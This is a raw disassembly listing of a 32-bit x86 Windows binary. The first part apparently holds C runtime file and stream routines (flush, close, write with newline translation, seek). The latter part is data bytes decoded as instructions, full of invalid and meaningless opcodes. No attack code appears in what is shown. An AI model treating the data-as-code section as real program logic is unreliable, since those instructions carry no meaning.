  406000:	cmp    eax,edi
  406002:	jne    0x406013
  406004:	mov    eax,DWORD PTR [esi+0xc]
  406007:	test   al,al
  406009:	jns    0x40601a
  40600b:	and    eax,0xfffffffd
  40600e:	mov    DWORD PTR [esi+0xc],eax
  406011:	jmp    0x40601a
  406013:	or     DWORD PTR [esi+0xc],0x20
  406017:	or     ebx,0xffffffff
  40601a:	pop    edi
  40601b:	mov    eax,DWORD PTR [esi+0x8]
  40601e:	and    DWORD PTR [esi+0x4],0x0
  406022:	mov    DWORD PTR [esi],eax
  406024:	pop    esi
  406025:	mov    eax,ebx
  406027:	pop    ebx
  406028:	ret    
  406029:	push   esi
  40602a:	mov    esi,DWORD PTR [esp+0x8]
  40602e:	test   esi,esi
  406030:	jne    0x40603b
  406032:	push   esi
  406033:	call   0x406064
  406038:	pop    ecx
  406039:	pop    esi
  40603a:	ret    
  40603b:	push   esi
  40603c:	call   0x405fcc
  406041:	test   eax,eax
  406043:	pop    ecx
  406044:	je     0x40604b
  406046:	or     eax,0xffffffff
  406049:	pop    esi
  40604a:	ret    
  40604b:	test   BYTE PTR [esi+0xd],0x40
  40604f:	je     0x406060
  406051:	push   DWORD PTR [esi+0x10]
  406054:	call   0x406374
  406059:	pop    ecx
  40605a:	neg    eax
  40605c:	sbb    eax,eax
  40605e:	pop    esi
  40605f:	ret    
  406060:	xor    eax,eax
  406062:	pop    esi
  406063:	ret    
  406064:	push   ebx
  406065:	push   esi
  406066:	push   edi
  406067:	xor    esi,esi
  406069:	xor    ebx,ebx
  40606b:	xor    edi,edi
  40606d:	cmp    DWORD PTR ds:0x4289a0,esi
  406073:	jle    0x4060c2
  406075:	mov    eax,ds:0x427984
  40607a:	mov    eax,DWORD PTR [eax+esi*4]
  40607d:	test   eax,eax
  40607f:	je     0x4060b9
  406081:	mov    ecx,DWORD PTR [eax+0xc]
  406084:	test   cl,0x83
  406087:	je     0x4060b9
  406089:	cmp    DWORD PTR [esp+0x10],0x1
  40608e:	jne    0x40609f
  406090:	push   eax
  406091:	call   0x406029
  406096:	cmp    eax,0xffffffff
  406099:	pop    ecx
  40609a:	je     0x4060b9
  40609c:	inc    ebx
  40609d:	jmp    0x4060b9
  40609f:	cmp    DWORD PTR [esp+0x10],0x0
  4060a4:	jne    0x4060b9
  4060a6:	test   cl,0x2
  4060a9:	je     0x4060b9
  4060ab:	push   eax
  4060ac:	call   0x406029
  4060b1:	cmp    eax,0xffffffff
  4060b4:	pop    ecx
  4060b5:	jne    0x4060b9
  4060b7:	or     edi,eax
  4060b9:	inc    esi
  4060ba:	cmp    esi,DWORD PTR ds:0x4289a0
  4060c0:	jl     0x406075
  4060c2:	cmp    DWORD PTR [esp+0x10],0x1
  4060c7:	mov    eax,ebx
  4060c9:	je     0x4060cd
  4060cb:	mov    eax,edi
  4060cd:	pop    edi
  4060ce:	pop    esi
  4060cf:	pop    ebx
  4060d0:	ret    
  4060d1:	push   0x1
  4060d3:	call   0x406064
  4060d8:	pop    ecx
  4060d9:	ret    
  4060da:	push   ebp
  4060db:	mov    ebp,esp
  4060dd:	push   ecx
  4060de:	mov    ecx,DWORD PTR [ebp+0x8]
  4060e1:	cmp    ecx,0xff
  4060e7:	jbe    0x406147
  4060e9:	and    WORD PTR [ebp-0x4],0x0
  4060ee:	push   edi
  4060ef:	xor    eax,eax
  4060f1:	lea    edi,[ebp-0x2]
  4060f4:	stos   WORD PTR es:[edi],ax
  4060f6:	mov    eax,ecx
  4060f8:	shr    eax,0x8
  4060fb:	cmp    DWORD PTR ds:0x4289c4,0x0
  406102:	mov    BYTE PTR [ebp+0xa],al
  406105:	mov    BYTE PTR [ebp+0xb],cl
  406108:	pop    edi
  406109:	jne    0x40610f
  40610b:	xor    eax,eax
  40610d:	leave  
  40610e:	ret    
  40610f:	push   0x1
  406111:	push   DWORD PTR ds:0x4289c0
  406117:	lea    eax,[ebp-0x4]
  40611a:	push   DWORD PTR ds:0x428ae4
  406120:	push   eax
  406121:	push   0x2
  406123:	lea    eax,[ebp+0xa]
  406126:	push   eax
  406127:	push   0x1
  406129:	call   0x404b04
  40612e:	add    esp,0x1c
  406131:	test   eax,eax
  406133:	je     0x40610b
  406135:	cmp    WORD PTR [ebp-0x2],0x0
  40613a:	jne    0x40610b
  40613c:	test   BYTE PTR [ebp-0x4],0x8
  406140:	je     0x40610b
  406142:	xor    eax,eax
  406144:	inc    eax
  406145:	leave  
  406146:	ret    
  406147:	cmp    DWORD PTR ds:0x427278,0x1
  40614e:	jle    0x40615c
  406150:	push   0x8
  406152:	push   ecx
  406153:	call   0x40312d
  406158:	pop    ecx
  406159:	pop    ecx
  40615a:	leave  
  40615b:	ret    
  40615c:	mov    eax,ds:0x427270
  406161:	movzx  eax,BYTE PTR [eax+ecx*2]
  406165:	and    eax,0x8
  406168:	leave  
  406169:	ret    
  40616a:	push   esi
  40616b:	mov    esi,DWORD PTR [esp+0x8]
  40616f:	mov    eax,DWORD PTR [esi+0xc]
  406172:	push   edi
  406173:	or     edi,0xffffffff
  406176:	test   al,0x40
  406178:	je     0x40617f
  40617a:	or     eax,0xffffffff
  40617d:	jmp    0x4061b9
  40617f:	test   al,0x83
  406181:	je     0x4061b7
  406183:	push   esi
  406184:	call   0x405fcc
  406189:	push   esi
  40618a:	mov    edi,eax
  40618c:	call   0x40647e
  406191:	push   DWORD PTR [esi+0x10]
  406194:	call   0x4063cb
  406199:	add    esp,0xc
  40619c:	test   eax,eax
  40619e:	jge    0x4061a5
  4061a0:	or     edi,0xffffffff
  4061a3:	jmp    0x4061b7
  4061a5:	mov    eax,DWORD PTR [esi+0x1c]
  4061a8:	test   eax,eax
  4061aa:	je     0x4061b7
  4061ac:	push   eax
  4061ad:	call   0x40331e
  4061b2:	and    DWORD PTR [esi+0x1c],0x0
  4061b6:	pop    ecx
  4061b7:	mov    eax,edi
  4061b9:	and    DWORD PTR [esi+0xc],0x0
  4061bd:	pop    edi
  4061be:	pop    esi
  4061bf:	ret    
  4061c0:	push   ebp
  4061c1:	mov    ebp,esp
  4061c3:	sub    esp,0x41c
  4061c9:	mov    eax,ds:0x4272a8
  4061ce:	xor    eax,DWORD PTR [ebp+0x4]
  4061d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4061d4:	cmp    ecx,DWORD PTR ds:0x428c08
  4061da:	push   ebx
  4061db:	push   esi
  4061dc:	mov    DWORD PTR [ebp-0x4],eax
  4061df:	push   edi
  4061e0:	jae    0x406350
  4061e6:	mov    eax,ecx
  4061e8:	sar    eax,0x5
  4061eb:	lea    ebx,[eax*4+0x428c20]
  4061f2:	mov    eax,DWORD PTR [ebx]
  4061f4:	mov    esi,ecx
  4061f6:	and    esi,0x1f
  4061f9:	shl    esi,0x3
  4061fc:	mov    al,BYTE PTR [eax+esi*1+0x4]
  406200:	test   al,0x1
  406202:	mov    DWORD PTR [ebp-0x18],ebx
  406205:	je     0x406350
  40620b:	xor    edi,edi
  40620d:	cmp    DWORD PTR [ebp+0x10],edi
  406210:	mov    DWORD PTR [ebp-0xc],edi
  406213:	mov    DWORD PTR [ebp-0x14],edi
  406216:	jne    0x40621f
  406218:	xor    eax,eax
  40621a:	jmp    0x406364
  40621f:	test   al,0x20
  406221:	je     0x406230
  406223:	push   0x2
  406225:	push   edi
  406226:	push   edi
  406227:	push   ecx
  406228:	call   0x4064a9
  40622d:	add    esp,0x10
  406230:	mov    eax,DWORD PTR [ebx]
  406232:	add    eax,esi
  406234:	test   BYTE PTR [eax+0x4],0x80
  406238:	je     0x4062ec
  40623e:	cmp    DWORD PTR [ebp+0x10],edi
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	mov    DWORD PTR [ebp-0x8],eax
  406247:	mov    DWORD PTR [ebp+0x8],edi
  40624a:	jbe    0x406324
  406250:	mov    ecx,DWORD PTR [ebp-0x8]
  406253:	sub    ecx,DWORD PTR [ebp+0xc]
  406256:	lea    eax,[ebp-0x41c]
  40625c:	cmp    ecx,DWORD PTR [ebp+0x10]
  40625f:	jae    0x406286
  406261:	mov    edx,DWORD PTR [ebp-0x8]
  406264:	inc    DWORD PTR [ebp-0x8]
  406267:	mov    dl,BYTE PTR [edx]
  406269:	inc    ecx
  40626a:	cmp    dl,0xa
  40626d:	jne    0x406277
  40626f:	inc    DWORD PTR [ebp-0x14]
  406272:	mov    BYTE PTR [eax],0xd
  406275:	inc    eax
  406276:	inc    edi
  406277:	mov    ebx,DWORD PTR [ebp-0x18]
  40627a:	mov    BYTE PTR [eax],dl
  40627c:	inc    eax
  40627d:	inc    edi
  40627e:	cmp    edi,0x400
  406284:	jl     0x40625c
  406286:	mov    edi,eax
  406288:	lea    eax,[ebp-0x41c]
  40628e:	sub    edi,eax
  406290:	push   0x0
  406292:	lea    eax,[ebp-0x10]
  406295:	push   eax
  406296:	push   edi
  406297:	lea    eax,[ebp-0x41c]
  40629d:	push   eax
  40629e:	mov    eax,DWORD PTR [ebx]
  4062a0:	push   DWORD PTR [eax+esi*1]
  4062a3:	call   DWORD PTR ds:0x425054
  4062a9:	test   eax,eax
  4062ab:	je     0x4062c6
  4062ad:	mov    eax,DWORD PTR [ebp-0x10]
  4062b0:	add    DWORD PTR [ebp-0xc],eax
  4062b3:	cmp    eax,edi
  4062b5:	jl     0x4062cf
  4062b7:	mov    eax,DWORD PTR [ebp-0x8]
  4062ba:	sub    eax,DWORD PTR [ebp+0xc]
  4062bd:	xor    edi,edi
  4062bf:	cmp    eax,DWORD PTR [ebp+0x10]
  4062c2:	jb     0x406250
  4062c4:	jmp    0x4062d1
  4062c6:	call   DWORD PTR ds:0x42501c
  4062cc:	mov    DWORD PTR [ebp+0x8],eax
  4062cf:	xor    edi,edi
  4062d1:	mov    eax,DWORD PTR [ebp-0xc]
  4062d4:	cmp    eax,edi
  4062d6:	jne    0x40634b
  4062d8:	cmp    DWORD PTR [ebp+0x8],edi
  4062db:	je     0x406324
  4062dd:	push   0x5
  4062df:	pop    eax
  4062e0:	cmp    DWORD PTR [ebp+0x8],eax
  4062e3:	jne    0x406319
  4062e5:	mov    ds:0x4277d0,eax
  4062ea:	jmp    0x406357
  4062ec:	push   edi
  4062ed:	lea    ecx,[ebp-0x10]
  4062f0:	push   ecx
  4062f1:	push   DWORD PTR [ebp+0x10]
  4062f4:	push   DWORD PTR [ebp+0xc]
  4062f7:	push   DWORD PTR [eax]
  4062f9:	call   DWORD PTR ds:0x425054
  4062ff:	test   eax,eax
  406301:	je     0x40630e
  406303:	mov    eax,DWORD PTR [ebp-0x10]
  406306:	mov    DWORD PTR [ebp+0x8],edi
  406309:	mov    DWORD PTR [ebp-0xc],eax
  40630c:	jmp    0x4062d1
  40630e:	call   DWORD PTR ds:0x42501c
  406314:	mov    DWORD PTR [ebp+0x8],eax
  406317:	jmp    0x4062d1
  406319:	push   DWORD PTR [ebp+0x8]
  40631c:	call   0x405d4d
  406321:	pop    ecx
  406322:	jmp    0x406361
  406324:	mov    eax,DWORD PTR [ebx]
  406326:	test   BYTE PTR [eax+esi*1+0x4],0x40
  40632b:	je     0x406339
  40632d:	mov    eax,DWORD PTR [ebp+0xc]
  406330:	cmp    BYTE PTR [eax],0x1a
  406333:	je     0x406218
  406339:	mov    DWORD PTR ds:0x4277cc,0x1c
  406343:	mov    DWORD PTR ds:0x4277d0,edi
  406349:	jmp    0x406361
  40634b:	sub    eax,DWORD PTR [ebp-0x14]
  40634e:	jmp    0x406364
  406350:	and    DWORD PTR ds:0x4277d0,0x0
  406357:	mov    DWORD PTR ds:0x4277cc,0x9
  406361:	or     eax,0xffffffff
  406364:	mov    ecx,DWORD PTR [ebp-0x4]
  406367:	xor    ecx,DWORD PTR [ebp+0x4]
  40636a:	pop    edi
  40636b:	pop    esi
  40636c:	pop    ebx
  40636d:	call   0x403606
  406372:	leave  
  406373:	ret    
  406374:	mov    eax,DWORD PTR [esp+0x4]
  406378:	cmp    eax,DWORD PTR ds:0x428c08
  40637e:	jae    0x4063bd
  406380:	mov    ecx,eax
  406382:	sar    ecx,0x5
  406385:	mov    ecx,DWORD PTR [ecx*4+0x428c20]
  40638c:	mov    edx,eax
  40638e:	and    edx,0x1f
  406391:	test   BYTE PTR [ecx+edx*8+0x4],0x1
  406396:	je     0x4063bd
  406398:	push   eax
  406399:	call   0x405f38
  40639e:	pop    ecx
  40639f:	push   eax
  4063a0:	call   DWORD PTR ds:0x425034
  4063a6:	test   eax,eax
  4063a8:	jne    0x4063b2
  4063aa:	call   DWORD PTR ds:0x42501c
  4063b0:	jmp    0x4063b4
  4063b2:	xor    eax,eax
  4063b4:	test   eax,eax
  4063b6:	je     0x4063ca
  4063b8:	mov    ds:0x4277d0,eax
  4063bd:	mov    DWORD PTR ds:0x4277cc,0x9
  4063c7:	or     eax,0xffffffff
  4063ca:	ret    
  4063cb:	push   ebx
  4063cc:	push   ebp
  4063cd:	push   esi
  4063ce:	push   edi
  4063cf:	mov    edi,DWORD PTR [esp+0x14]
  4063d3:	cmp    edi,DWORD PTR ds:0x428c08
  4063d9:	jae    0x406465
  4063df:	mov    eax,edi
  4063e1:	sar    eax,0x5
  4063e4:	mov    esi,edi
  4063e6:	and    esi,0x1f
  4063e9:	lea    ebx,[eax*4+0x428c20]
  4063f0:	mov    eax,DWORD PTR [ebx]
  4063f2:	shl    esi,0x3
  4063f5:	test   BYTE PTR [eax+esi*1+0x4],0x1
  4063fa:	je     0x406465
  4063fc:	push   edi
  4063fd:	call   0x405f38
  406402:	cmp    eax,0xffffffff
  406405:	pop    ecx
  406406:	je     0x406444
  406408:	cmp    edi,0x1
  40640b:	je     0x406412
  40640d:	cmp    edi,0x2
  406410:	jne    0x406428
  406412:	push   0x2
  406414:	call   0x405f38
  406419:	push   0x1
  40641b:	mov    ebp,eax
  40641d:	call   0x405f38
  406422:	cmp    eax,ebp
  406424:	pop    ecx
  406425:	pop    ecx
  406426:	je     0x406444
  406428:	push   edi
  406429:	call   0x405f38
  40642e:	pop    ecx
  40642f:	push   eax
  406430:	call   DWORD PTR ds:0x4250e0
  406436:	test   eax,eax
  406438:	jne    0x406444
  40643a:	call   DWORD PTR ds:0x42501c
  406440:	mov    ebp,eax
  406442:	jmp    0x406446
  406444:	xor    ebp,ebp
  406446:	push   edi
  406447:	call   0x405ebe
  40644c:	mov    eax,DWORD PTR [ebx]
  40644e:	and    BYTE PTR [eax+esi*1+0x4],0x0
  406453:	test   ebp,ebp
  406455:	pop    ecx
  406456:	je     0x406461
  406458:	push   ebp
  406459:	call   0x405d4d
  40645e:	pop    ecx
  40645f:	jmp    0x406476
  406461:	xor    eax,eax
  406463:	jmp    0x406479
  406465:	and    DWORD PTR ds:0x4277d0,0x0
  40646c:	mov    DWORD PTR ds:0x4277cc,0x9
  406476:	or     eax,0xffffffff
  406479:	pop    edi
  40647a:	pop    esi
  40647b:	pop    ebp
  40647c:	pop    ebx
  40647d:	ret    
  40647e:	push   esi
  40647f:	mov    esi,DWORD PTR [esp+0x8]
  406483:	mov    eax,DWORD PTR [esi+0xc]
  406486:	test   al,0x83
  406488:	je     0x4064a7
  40648a:	test   al,0x8
  40648c:	je     0x4064a7
  40648e:	push   DWORD PTR [esi+0x8]
  406491:	call   0x40331e
  406496:	and    WORD PTR [esi+0xc],0xfbf7
  40649c:	xor    eax,eax
  40649e:	pop    ecx
  40649f:	mov    DWORD PTR [esi],eax
  4064a1:	mov    DWORD PTR [esi+0x8],eax
  4064a4:	mov    DWORD PTR [esi+0x4],eax
  4064a7:	pop    esi
  4064a8:	ret    
  4064a9:	push   ebp
  4064aa:	mov    ebp,esp
  4064ac:	push   ecx
  4064ad:	push   ecx
  4064ae:	mov    eax,DWORD PTR [ebp+0x8]
  4064b1:	cmp    eax,DWORD PTR ds:0x428c08
  4064b7:	push   esi
  4064b8:	push   edi
  4064b9:	jae    0x40652d
  4064bb:	mov    ecx,eax
  4064bd:	sar    ecx,0x5
  4064c0:	mov    esi,eax
  4064c2:	and    esi,0x1f
  4064c5:	lea    edi,[ecx*4+0x428c20]
  4064cc:	mov    ecx,DWORD PTR [edi]
  4064ce:	shl    esi,0x3
  4064d1:	test   BYTE PTR [ecx+esi*1+0x4],0x1
  4064d6:	je     0x40652d
  4064d8:	mov    ecx,DWORD PTR [ebp+0xc]
  4064db:	mov    DWORD PTR [ebp-0x8],ecx
  4064de:	mov    ecx,DWORD PTR [ebp+0x10]
  4064e1:	push   eax
  4064e2:	mov    DWORD PTR [ebp-0x4],ecx
  4064e5:	call   0x405f38
  4064ea:	cmp    eax,0xffffffff
  4064ed:	pop    ecx
  4064ee:	je     0x406534
  4064f0:	push   DWORD PTR [ebp+0x14]
  4064f3:	lea    ecx,[ebp-0x4]
  4064f6:	push   ecx
  4064f7:	push   DWORD PTR [ebp-0x8]
  4064fa:	push   eax
  4064fb:	call   DWORD PTR ds:0x4250dc
  406501:	cmp    eax,0xffffffff
  406504:	mov    DWORD PTR [ebp-0x8],eax
  406507:	jne    0x40651c
  406509:	call   DWORD PTR ds:0x42501c
  40650f:	test   eax,eax
  406511:	je     0x40651c
  406513:	push   eax
  406514:	call   0x405d4d
  406519:	pop    ecx
  40651a:	jmp    0x40653e
  40651c:	mov    eax,DWORD PTR [edi]
  40651e:	lea    eax,[eax+esi*1+0x4]
  406522:	and    BYTE PTR [eax],0xfd
  406525:	mov    eax,DWORD PTR [ebp-0x8]
  406528:	mov    edx,DWORD PTR [ebp-0x4]
  40652b:	jmp    0x406544
  40652d:	and    DWORD PTR ds:0x4277d0,0x0
  406534:	mov    DWORD PTR ds:0x4277cc,0x9
  40653e:	or     eax,0xffffffff
  406541:	or     edx,0xffffffff
  406544:	pop    edi
  406545:	pop    esi
  406546:	leave  
  406547:	ret    
  406548:	jmp    DWORD PTR ds:0x4250d4
  40654e:	int3   
  40654f:	int3   
  406550:	inc    DWORD PTR [eax]
	...
  40ac22:	add    BYTE PTR [eax],al
  40ac24:	sbb    DWORD PTR [eax],esp
  40ac26:	or     al,0x9
  40ac28:	pop    ds
  40ac29:	popa   
  40ac2a:	adc    ebp,DWORD PTR [ecx+0x1ec90300]
	...
  40b0a0:	add    BYTE PTR [eax],al
  40b0a2:	dec    ebp
  40b0a3:	pop    edx
  40b0a4:	mov    WORD PTR [eax],es
  40b0a6:	pop    es
  40b0a7:	add    al,0xf8
  40b0a9:	add    al,0xc
  40b0ab:	or     ah,dh
  40b0ad:	or     bl,dh
  40b0af:	or     eax,0x10a80cf0
  40b0b4:	in     al,dx
  40b0b5:	adc    BYTE PTR [esp+edx*1],dl
  40b0b8:	call   0xe45908d1
  40b0bd:	sbb    BYTE PTR [esp+ebx*1],bl
  40b0c0:	loopne 0x40b0de
  40b0c2:	and    BYTE PTR [eax],ah
  40b0c4:	fsub   QWORD PTR [eax]
  40b0c6:	and    al,0x24
  40b0c8:	fsub   DWORD PTR [eax+ebp*1]
  40b0cb:	sub    ah,dl
  40b0cd:	sub    BYTE PTR [esp+ebp*1],ch
  40b0d0:	shr    BYTE PTR [eax+esi*1],1
  40b0d3:	xor    ah,cl
  40b0d5:	xor    BYTE PTR [esp+esi*1],dh
  40b0d8:	enter  0x3834,0x38
  40b0dc:	les    edi,FWORD PTR [eax]
  40b0de:	xor    al,0x3f
  40b0e0:	sar    BYTE PTR [esi+ecx*2],0x61
  40b0e4:	cli    
  40b0e5:	push   edx
  40b0e6:	inc    esp
  40b0e7:	lock inc ecx
  40b0e9:	xchg   edi,eax
  40b0ea:	imul   esi,eax,0x6f8104b5
  40b0f0:	sbb    al,0x24
  40b0f2:	cmp    DWORD PTR ds:0x2526204c,esp
  40b0f8:	xor    esp,DWORD PTR [edx]
  40b0fa:	cmp    DWORD PTR [edi],esi
  40b0fc:	inc    esp
  40b0fd:	cmp    eax,0x2d32323d
  40b102:	adc    al,0x40
  40b104:	add    cl,BYTE PTR [ebx]
  40b106:	inc    esp
  40b107:	push   ss
  40b108:	adc    eax,0x6034816
  40b10d:	dec    eax
  40b10e:	sub    BYTE PTR ds:0x11d4c3f,bh
  40b114:	adc    BYTE PTR [ebx],bl
  40b116:	pop    edx
  40b117:	jnp    0x40b196
  40b119:	jp     0x40b177
  40b11b:	js     0x40b0a1
  40b11d:	js     0x40b19b
  40b11f:	jl     0x40b0a1
  40b121:	jl     0x40b0c3
  40b123:	mov    gs,ebx
  40b125:	test   eax,0xf085f5e0
  40b12a:	in     al,dx
  40b12b:	stc    
  40b12c:	mov    esp,edi
  40b12e:	call   0xf5393f30
  40b133:	loope  0x40b0c6
  40b135:	in     al,0xf2
  40b137:	in     eax,0x95
  40b139:	loopne 0x40b130
  40b13b:	adc    DWORD PTR [esp+ebp*8],0xe89dedf9
  40b142:	xor    eax,0xf0d46a0b
  40b147:	aad    0xa5
  40b149:	sar    BYTE PTR ds:0xdbdc6c03,1
  40b14f:	(bad)  [ebp+0x7b1b25d8]
  40b155:	les    edi,FWORD PTR [edi-0x2a3f4a3b]
  40b15b:	mov    eax,ds:0xcdd0cc3e
  40b160:	mov    ebp,0x56d9adc8
  40b165:	mov    ah,0xb5
  40b167:	mov    ch,0xc5
  40b169:	mov    al,0xac
  40b16b:	mov    ecx,0xbd7dbcc8
  40b170:	int    0xb8
  40b172:	rcl    BYTE PTR [ebx+0x6],cl
  40b175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b176:	nop
  40b177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b178:	aad    0xa0
  40b17a:	ficomp DWORD PTR [ebx+0x10]
  40b17d:	lods   al,BYTE PTR ds:[esi]
  40b17e:	mov    ecx,0xe2a8ddad
  40b183:	arpl   WORD PTR ds:0xe5958194,sp
  40b189:	nop
  40b18a:	mov    edx,0x88808b83
  40b18f:	popf   
  40b190:	in     eax,dx
  40b191:	cwde   
  40b192:	lock lock or al,0xf0
  40b196:	hlt    
  40b197:	hlt    
  40b198:	or     ah,dh
  40b19a:	clc    
  40b19b:	clc    
  40b19c:	add    al,0xf8
  40b19e:	cld    
  40b19f:	cld    
  40b1a0:	add    ah,bh
  40b1a2:	add    BYTE PTR [eax],al
  40b1a4:	cld    
  40b1a5:	add    BYTE PTR [esp+eax*1],al
  40b1a8:	clc    
  40b1a9:	add    al,0x58
  40b1ab:	dec    edi
  40b1ac:	hlt    
  40b1ad:	or     BYTE PTR [eax+0xf],al
  40b1b0:	(bad)  
  40b1b2:	adc    DWORD PTR [edx+0x14144510],ebp
  40b1b8:	call   0xe458c9d1
  40b1bd:	sbb    ah,bh
  40b1bf:	sbb    al,0x1e
  40b1c1:	sbb    ebp,DWORD PTR [ebx]
  40b1c3:	and    ebp,DWORD PTR [ebx]
  40b1c5:	and    BYTE PTR [esp+edx*1],ah
  40b1c8:	es and al,0x28
  40b1cb:	enter  0x28d4,0x2c
  40b1cf:	sub    al,0xd0
  40b1d1:	sub    al,0x76
  40b1d3:	sbb    ecx,ebp
  40b1d5:	xor    BYTE PTR [esp],dh
  40b1d8:	enter  0x3834,0x78
  40b1dc:	cmp    bh,BYTE PTR [eax]
  40b1de:	cmp    al,0x3c
  40b1e0:	add    BYTE PTR [eax+eax*2],bh
  40b1e3:	push   eax
  40b1e4:	mov    esp,0xb8464440
  40b1e9:	inc    esp
  40b1ea:	dec    ebp
  40b1eb:	dec    eax
  40b1ec:	mov    ch,0x48
  40b1ee:	dec    esp
  40b1ef:	dec    esp
  40b1f0:	mov    al,0x4c
  40b1f2:	push   ebp
  40b1f3:	push   eax
  40b1f4:	lods   eax,DWORD PTR ds:[esi]
  40b1f5:	push   eax
  40b1f6:	push   esp
  40b1f7:	push   esp
  40b1f8:	test   al,0x54
  40b1fa:	pop    eax
  40b1fb:	sub    BYTE PTR [ebx+0x58],bl
  40b1fe:	pop    esp
  40b1ff:	pop    eax
  40b200:	mov    al,ds:0x9dbb265c
  40b205:	pusha  
  40b206:	fs pop ax
  40b209:	jecxz  0x40b273
  40b20b:	push   0x7c6c6864
  40b210:	nop
  40b211:	ins    BYTE PTR es:[edi],dx
  40b212:	jo     0x40b284
  40b214:	jl     0x40b286
  40b216:	je     0x40b27c
  40b218:	mov    BYTE PTR [eax+edi*2+0x78],dh
  40b21c:	test   BYTE PTR [eax+0x6c],bh
  40b21f:	jl     0x40b1a1
  40b221:	jl     0x40b1a3
  40b223:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40b228:	js     0x40b1ae
  40b22a:	pop    esp
  40b22b:	(bad)  
  40b22c:	mov    ecx,DWORD PTR [eax-0x738f713d]
  40b232:	nop
  40b233:	mov    al,ds:0x8bfc9093
  40b238:	push   0x64989894
  40b23d:	cwde   
  40b23e:	pushf  
  40b23f:	pushf  
  40b240:	pusha  
  40b241:	pushf  
  40b242:	mov    al,ds:0xa4a05ca0
  40b247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b248:	pop    eax
  40b249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b24a:	test   al,0xc8
  40b24c:	stos   DWORD PTR es:[edi],eax
  40b24d:	test   al,0xb4
  40b24f:	lods   al,BYTE PTR ds:[esi]
  40b250:	push   eax
  40b251:	lods   al,BYTE PTR ds:[esi]
  40b252:	mov    al,0xb0
  40b254:	dec    esp
  40b255:	mov    al,0xb4
  40b257:	mov    ah,0x48
  40b259:	mov    ah,0xb8
  40b25b:	mov    eax,0xbcbcb844
  40b260:	inc    eax
  40b261:	mov    esp,0xc03cc0c0
  40b266:	(bad)  
  40b267:	les    edi,FWORD PTR [eax]
  40b269:	(bad)  
  40b26a:	enter  0x34c8,0xc8
  40b26e:	int3   
  40b26f:	int3   
  40b270:	xor    ah,cl
  40b272:	rcl    al,1
  40b274:	sub    al,0xd0
  40b276:	aam    0xd4
  40b278:	sub    ah,dl
  40b27a:	fcomp  st(0)
  40b27c:	and    al,0xd8
  40b27e:	(bad)  
  40b280:	and    ah,bl
  40b282:	loopne 0x40b264
  40b284:	sbb    al,0xe0
  40b286:	in     al,0xe4
  40b288:	sbb    ah,ah
  40b28a:	call   0xed28c777
  40b28f:	in     al,dx
  40b290:	adc    ah,ch
  40b292:	lock lock or al,0xf0
  40b296:	hlt    
  40b297:	hlt    
  40b298:	or     ah,dh
  40b29a:	clc    
  40b29b:	clc    
  40b29c:	add    al,0xf8
  40b29e:	cld    
  40b29f:	cld    
  40b2a0:	add    ah,bh
  40b2a2:	cs je  0x40b306
  40b2a5:	js     0x40b317
  40b2a7:	add    al,0xf8
  40b2a9:	add    al,0x8
  40b2ab:	sub    BYTE PTR [ebx],cl
  40b2ad:	or     BYTE PTR [esp+ebx*1],cl
  40b2b0:	lock or al,0x10
  40b2b3:	or     al,0xed
  40b2b5:	adc    BYTE PTR [eax+edx*1],dl
  40b2b8:	call   0x5b9ffad1
  40b2bd:	cs inc edx
  40b2bf:	dec    ebp
  40b2c0:	loopne 0x40b2de
  40b2c2:	and    BYTE PTR [eax],ah
  40b2c4:	fsub   QWORD PTR [eax]
  40b2c6:	inc    esp
  40b2c7:	and    al,0xd8
  40b2c9:	les    eax,FWORD PTR [esi]
  40b2cb:	pop    edx
  40b2cc:	pop    ebx
  40b2cd:	pop    esi
  40b2ce:	dec    edi
  40b2cf:	sub    al,0xd0
  40b2d1:	sub    al,0x30
  40b2d3:	add    ah,cl
  40b2d5:	xor    BYTE PTR [esp+eax*1],dh
  40b2d8:	aaa    
  40b2d9:	xor    al,0x38
  40b2db:	push   ss
  40b2dc:	les    edi,FWORD PTR [eax]
  40b2de:	cmp    al,0x1c
  40b2e0:	sar    DWORD PTR [eax+eax*2],0x40
  40b2e4:	mov    esp,0xb8444440
  40b2e9:	inc    esp
  40b2ea:	dec    eax
  40b2eb:	dec    eax
  40b2ec:	mov    ah,0x48
  40b2ee:	ins    BYTE PTR es:[edi],dx
  40b2ef:	dec    esp
  40b2f0:	mov    al,0xac
  40b2f2:	jle    0x40b316
  40b2f4:	xor    DWORD PTR [ebx+edi*1],edi
  40b2f7:	xor    DWORD PTR [eax-0x5ba5a7ac],ebp
  40b2fd:	pop    eax
  40b2fe:	pop    esp
  40b2ff:	cmp    al,0x5f
  40b301:	pop    esp
  40b302:	pusha  
  40b303:	bound  ebx,QWORD PTR [eax+eiz*2+0x64992a64]
  40b30a:	push   0x6c689468
  40b30f:	ins    BYTE PTR es:[edi],dx
  40b310:	nop
  40b311:	ins    BYTE PTR es:[edi],dx
  40b312:	jo     0x40b384
  40b314:	mov    WORD PTR [eax+0x34],?
  40b317:	je     0x40b2a1
  40b319:	mov    ah,0x78
  40b31b:	js     0x40b2a1
  40b31d:	js     0x40b39b
  40b31f:	jl     0x40b2a1
  40b321:	jl     0x40b2a3
  40b323:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40b328:	js     0x40b2ae
  40b32a:	mov    BYTE PTR [eax-0x7373778c],cl
  40b330:	jo     0x40b2be
  40b332:	nop
  40b333:	nop
  40b334:	ins    BYTE PTR es:[edi],dx
  40b335:	nop
  40b336:	xchg   esp,eax
  40b337:	xchg   esp,eax
  40b338:	push   0x64989894
  40b33d:	cwde   
  40b33e:	pushf  
  40b33f:	pushf  
  40b340:	pusha  
  40b341:	pushf  
  40b342:	mov    al,ds:0xa4a05ca0
  40b347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b348:	pop    eax
  40b349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b34a:	test   al,0xa8
  40b34c:	push   esp
  40b34d:	test   al,0xac
  40b34f:	lods   al,BYTE PTR ds:[esi]
  40b350:	push   eax
  40b351:	lods   al,BYTE PTR ds:[esi]
  40b352:	mov    al,0xb0
  40b354:	dec    esp
  40b355:	mov    al,0xb4
  40b357:	mov    ah,0x48
  40b359:	mov    ah,0xb8
  40b35b:	mov    eax,0xbcbcb844
